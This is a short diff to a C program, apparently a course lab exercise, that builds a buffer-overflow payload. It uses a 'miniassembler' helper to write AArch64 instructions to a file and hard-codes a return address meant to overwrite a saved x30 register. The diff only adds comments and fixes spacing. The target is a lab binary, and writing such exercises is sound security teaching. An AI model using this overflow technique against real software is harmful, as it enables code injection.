@@ -13,7 +13,10 @@
 #include <stdlib.h>
 #include "miniassembler.h"
 
+/* Return address stored in getName's x30 after buffer overrun */
 static const unsigned int lReturnAddress = 0x42006C;
+
+/* char array containing my name */
 static const char sName[] = "Chinmay Bhandaru";
 
 
@@ -40,7 +43,7 @@ int main(void) {
     (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* adr x1, 0x420044 */
-    uiInstr = MiniAssembler_adr(1, 0x420044,0x420070);
+    uiInstr = MiniAssembler_adr(1, 0x420044, 0x420070);
     (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* strb x0, [x1] */
